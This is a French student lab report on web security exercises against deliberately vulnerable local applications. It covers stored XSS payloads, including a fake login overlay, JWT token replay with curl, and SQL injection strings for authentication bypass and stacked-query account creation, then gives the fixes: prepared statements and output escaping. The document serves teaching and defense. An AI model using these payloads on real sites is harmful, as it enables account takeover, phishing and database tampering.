---
title: "Introduction à la Cybersécurité Web"
module: "R209"
competence: "Sécuriser"
ac_lies: ["AC14.01", "AC14.02"]
techs: ["PHP", "SQL", "Flask"]
date: "2026-05-27"
status: "Terminé"
image: "/assets/projects/intro-cyber-visu.png"
---

# Compte-Rendu Technique : Introduction à la Cybersécurité Web
> **R209 — Introduction à la Cybersécurité** — *Briac Le Meillat*

Ce compte-rendu détaille la mise en œuvre pratique des failles de sécurité web les plus courantes (XSS Stockée, Vol de Token JWT, Injections SQL) selon une démarche offensive (Pentesting) sur des applications volontairement vulnérables, afin de comprendre comment mettre en œuvre des contre-mesures efficaces (Défense). L'environnement de travail est une pile LAMP sous WSL2 (Ubuntu) couplée à un serveur Flask (Python).

---

## 🛠️ Étape Préparatoire : Configuration de l'environnement (LAMP sous WSL)

### 💡 L'explication vulgarisée
Pour héberger un site web dynamique en PHP et stocker ses données, nous avons transformé notre machine Linux (WSL) en un serveur local standard (pile LAMP : Linux, Apache, MySQL, PHP). C'est ce serveur qui va exécuter le code vulnérable fourni par le professeur.

---

### 🖥️ Explication Détaillée & Réalisation

L'intégralité du TP est réalisable sur une machine locale Windows grâce à WSL (Ubuntu), évitant ainsi l'utilisation des machines de l'IUT.

#### A. Installation des paquets et démarrage des services

```bash
sudo apt update && sudo apt install apache2 mysql-server php php-mysql -y
sudo service apache2 start
sudo service mysql start
```

> [!NOTE]
> **Particularité WSL2 :**
> Sous WSL2, MySQL tourne via `mysqld_safe` et non via systemd. La commande `sudo service mysql status` peut indiquer "stopped" même si le processus est actif. Pour vérifier l'état réel du serveur, utiliser :
> ```bash
> pgrep -a mysqld
> ```

#### B. Déploiement des fichiers du TP

Les fichiers sources du TP sont déployés via un lien symbolique afin que toute modification dans le répertoire de développement soit immédiatement répercutée sur le serveur Apache :

```bash
sudo ln -s /home/briacl/Development/r209/tp4 /var/www/html/tp4
```

Les pages sont alors accessibles à l'adresse : `http://localhost/tp4/`

#### C. Création de la base de données et des tables

```bash
mysql -u root -p -e "CREATE DATABASE r209tp4 CHARACTER SET utf8;"
mysql -u root -p r209tp4 -e "CREATE TABLE tchat (id INT AUTO_INCREMENT PRIMARY KEY, pseudo VARCHAR(50), message TEXT);"
mysql -u root -p r209tp4 -e "CREATE TABLE injection (id INT AUTO_INCREMENT PRIMARY KEY, pseudo VARCHAR(50), password VARCHAR(50));"
mysql -u root -p r209tp4 -e "INSERT INTO injection (pseudo, password) VALUES ('toto', '1234');"
```

---

## 🔴 Partie 1 — Faille XSS Pure (Stored XSS)

### 💡 L'explication vulgarisée

Une faille XSS Stockée (Stored Cross-Site Scripting) se produit lorsque l'application web accepte une entrée utilisateur (un message dans un tchat, un pseudo) sans la vérifier, et la stocke directement dans la base de données.

Lorsqu'un autre utilisateur consulte la page, le serveur web injecte cette donnée brute dans le code HTML renvoyé au navigateur. Si la donnée contient du code JavaScript, le navigateur de la victime l'exécute, pensant qu'il s'agit d'une instruction légitime du site.

---

### 🖥️ Explication Détaillée & Réalisation

Le fichier vulnérable est `partie1/partie1.php`, accessible via `http://localhost/tp4/partie1/partie1.php`.

Il s'agit d'un tchat : le pseudo et le message sont insérés directement en BDD sans aucune sanitisation, puis réaffichés tels quels à chaque chargement de page.

#### Objectif 1 : Alerte au rafraîchissement (Popup)

En insérant une balise `<script>` dans le formulaire du tchat, le script s'enregistre en BDD. À chaque rechargement de `partie1.php`, le navigateur interprète le script et déclenche l'alerte.

**Payload injecté :**
```html
<script>alert('Faille XSS validée !');</script>
```

#### Objectif 2 : Phishing (Faux formulaire de connexion)

L'attaquant exploite la faille pour injecter du code HTML/CSS masquant le site légitime derrière une fausse interface de connexion afin de tromper l'utilisateur.

**Payload injecté :**
```html
<div style="position:fixed; top:0; left:0; width:100%; height:100%; background:white; z-index:9999; padding:50px;">
    <h2>Votre session a expiré. Veuillez vous reconnecter :</h2>
    <form>
        <input type="text" placeholder="Utilisateur" name="user"><br><br>
        <input type="password" placeholder="Mot de passe" name="pass"><br><br>
        <button type="submit">Se connecter</button>
    </form>
</div>
```

#### Objectif 3 : Redirection malveillante (hacked.php)

Création d'un lien piégé s'ouvrant dans un nouvel onglet tout en exécutant une action JavaScript d'alerte lors du clic (`onclick`).

**Payload injecté :**
```html
<a href="hacked.php" target="_blank" onclick="alert('Ahah tu as été hacké !')">Cliquez ici pour voir votre profil</a>
```

---

## 🔑 Partie 2 — Vol et utilisation de Token (JWT / Flask)

### 💡 L'explication vulgarisée

Dans une application moderne, après authentification, le serveur remet un badge numérique à l'utilisateur : un JWT (JSON Web Token). Ce badge prouve l'identité de l'utilisateur à chaque requête sans avoir à renvoyer le mot de passe. Si un attaquant parvient à voler ce badge (par exemple via la faille XSS de la partie 1), il lui suffit de l'ajouter à ses propres requêtes pour usurper l'identité de la victime.

---

### 🖥️ Explication Détaillée & Réalisation

L'environnement du serveur d'authentification est lancé via Flask (Python). L'interaction est exécutée directement via le terminal avec `curl`.

#### A. Lancement du serveur d'API

```bash
pip install Flask PyJWT
export FLASK_APP=server.py
flask run
```

> [!NOTE]
> **Correction appliquée dans `server.py` :**
> L'appel `app.run()` était placé avant la déclaration des routes et de la configuration. Il a été supprimé car il entre en conflit avec la CLI `flask run`. Les routes `/login` et `/secure` sont les deux seuls endpoints disponibles — la racine `/` renvoie un 404 normal.

#### B. Étape A — Génération du badge (Route `/login`)

Envoi des identifiants au format JSON pour récupérer le token JWT valide généré par le serveur.

```bash
curl -X GET "http://127.0.0.1:5000/login" -H "Content-Type: application/json" -d "{\"pseudo\":\"test\",\"password\":\"test\"}"
```

**Retour du serveur (Token obtenu) :**
```json
{"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJwc2V1ZG8iOiJ0ZXN0In0.8CoR25dxMxmQ6wSLPmasKGMZri-LoPfcRkEgnyjSUkI"}
```

#### C. Étape B — Accès à la zone sécurisée avec le Token (Route `/secure`)

En insérant le token dans le Header HTTP nommé `token`, le serveur valide l'identité de manière transparente :

```bash
curl -X GET "http://127.0.0.1:5000/secure" -H "token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJwc2V1ZG8iOiJ0ZXN0In0.8CoR25dxMxmQ6wSLPmasKGMZri-LoPfcRkEgnyjSUkI"
```

**Retour du serveur (Succès) :**
```json
{"msg":"autorisé"}
```

---

## 💉 Partie 3 — Injection SQL (SQLi)

### 💡 L'explication vulgarisée

Une injection SQL se produit lorsque le code PHP construit une requête pour la base de données en y insérant directement (par concaténation) les chaînes de caractères tapées par l'utilisateur. L'attaquant en profite pour glisser des morceaux de syntaxe SQL (guillemets `'`, commentaires `#`, opérateurs logiques `OR`). La base de données interprète ces données comme des commandes logiques directes de l'application.

---

### 🖥️ Explication Détaillée & Réalisation

Le fichier vulnérable est `partie3/connexion.php`, accessible via `http://localhost/tp4/partie3/connexion.php`.

La requête vulnérable exécutée en arrière-plan est :
```sql
SELECT COUNT(id) FROM injection WHERE pseudo = '$pseudo' AND password = '$mdp'
```

> [!WARNING]
> **Compatibilité MySQL 8 :**
> Sous MySQL 8, le commentaire `--` (sans espace suivi d'un caractère) est rejeté avec une erreur de syntaxe. Il faut utiliser `#` à la place pour commenter la fin de la requête.

#### Objectif 1 : Se connecter au compte "toto" sans connaître le mot de passe

Le but est de forcer la condition sur le pseudo et d'annuler syntaxiquement le reste de la requête.

| Champ | Valeur |
|-------|--------|
| Pseudo | `toto' #` |
| Mot de passe | `1234` (n'importe quelle valeur non vide) |

**Requête résultante exécutée :**
```sql
SELECT COUNT(id) FROM injection WHERE pseudo = 'toto' # ' AND password = '1234'
```
Le symbole `#` commente la fin de la ligne. La vérification du mot de passe est ignorée.

#### Objectif 2 : Se connecter sur le premier compte disponible

Le but est de rendre l'instruction logique universellement vraie (`1=1`).

| Champ | Valeur |
|-------|--------|
| Pseudo | `' OR 1=1 #` |
| Mot de passe | `1234` (n'importe quelle valeur non vide) |

**Requête résultante exécutée :**
```sql
SELECT COUNT(id) FROM injection WHERE pseudo = '' OR 1=1 # ' AND password = '1234'
```
La condition `1=1` étant toujours vraie, la base de données renvoie la première ligne de la table.

#### Objectif 3 : Création d'un compte malveillant (Stacked Queries)

Le but est d'utiliser `;` pour exécuter une seconde requête `INSERT INTO` à la suite de la requête initiale.

| Champ | Valeur |
|-------|--------|
| Pseudo | `'; INSERT INTO injection (pseudo, password) VALUES ('briac', 'secure123'); #` |
| Mot de passe | `1234` |

**La BDD interprète et applique séquentiellement deux ordres :**
1. `SELECT COUNT(id) FROM injection WHERE pseudo = '';` → renvoie 0
2. `INSERT INTO injection (pseudo, password) VALUES ('briac', 'secure123');` → crée l'utilisateur

**Résultat :** L'attaquant peut ensuite se connecter avec `briac` / `secure123`.

---

## 🛡️ Partie 4 — Sécurisation (Défense)

### 1. Protection contre les Injections SQL : Les Requêtes Préparées

La concaténation directe de chaînes doit être bannie. La solution consiste à séparer strictement la structure de la requête SQL des données utilisateur via les requêtes préparées (Prepared Statements) avec PDO.

**Avant (vulnérable) — `connexion.php` :**
```php
$reqConn = $bdd->query("SELECT COUNT(id) as countid FROM injection WHERE pseudo = '$pseudo' AND password = '$mdp'");
$count = $reqConn->fetch();
$countCheck = $count['countid'];
```

**Après (sécurisé) — `connexion.php` :**
```php
$stmt = $bdd->prepare('SELECT COUNT(id) as countid FROM injection WHERE pseudo = :pseudo AND password = :password');
$stmt->execute([
    'pseudo' => $pseudo,
    'password' => $mdp
]);
$count = $stmt->fetch();
$countCheck = $count['countid'];
```

**Principe technique :** Le SGBD compile le plan d'exécution de la requête avant d'y intégrer les variables. Les saisies utilisateurs sont traitées uniquement comme des valeurs littérales et ne peuvent plus modifier la logique SQL.

### 2. Protection contre les Failles XSS : L'Échappement des Sorties

L'erreur de la Partie 1 réside dans l'affichage direct de données brutes issues de la BDD. Il faut transformer les caractères de contrôle HTML avant leur insertion dans le DOM.

**Avant (vulnérable) — `partie1.php` :**
```php
echo "<span><b>".$msg['pseudo']." :</b> ".$msg['message']."</span><br>";
```

**Après (sécurisé) — `partie1.php` :**
```php
echo "<span><b>".htmlspecialchars($msg['pseudo'], ENT_QUOTES, 'UTF-8')." :</b> ".htmlspecialchars($msg['message'], ENT_QUOTES, 'UTF-8')."</span><br>";
```

**Principe technique :** `htmlspecialchars()` convertit les caractères sensibles en entités HTML (ex: `<script>` devient `&lt;script&gt;`). Le navigateur affiche la chaîne comme du texte inoffensif au lieu de l'interpréter comme un script exécutable.

---

## ✅ Conclusion

Ce TP met en évidence qu'une application web ne doit jamais faire confiance aux données provenant des utilisateurs (*"Never trust user input"*). Qu'il s'agisse d'un affichage sur navigateur (XSS) ou d'une interprétation par un moteur de base de données (SQLi), la désinfection, l'échappement et le paramétrage des requêtes constituent le premier rempart essentiel de la sécurité applicative.

> [!TIP]
> **Résumé des failles étudiées :**
> - 🔴 **XSS Stockée** : Injection de scripts via le tchat — contre-mesure : `htmlspecialchars()`.
> - 🔑 **Vol de JWT** : Usurpation d'identité par réutilisation d'un token volé.
> - 💉 **Injection SQL** : Bypass d'authentification et création de comptes — contre-mesure : requêtes préparées PDO.
